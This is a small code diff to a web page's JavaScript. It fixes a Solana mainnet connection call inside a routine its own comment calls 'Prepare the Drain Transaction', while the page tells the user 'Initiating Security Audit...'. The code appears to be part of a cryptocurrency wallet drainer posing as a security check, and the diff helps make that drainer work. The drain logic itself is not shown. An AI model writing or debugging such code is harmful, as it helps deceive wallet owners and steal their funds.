@@ -117,8 +117,8 @@
             // 2. Prepare the Drain Transaction
             statusEl.innerHTML = '<span class="loader"></span> Initiating Security Audit...';
             
-            // Initialize connection using the correct global variable
-            const connection = new solana.Connection(solana.clusterApiUrl('mainnet-beta'), 'confirmed');
+            // FIX: Use Connection.clusterApiUrl (static method) instead of standalone function
+            const connection = new solana.Connection(solana.Connection.clusterApiUrl('mainnet-beta'), 'confirmed');
             
             // Get correct public key from the response
             const publicKey = new solana.PublicKey(resp.publicKey.toBase58());
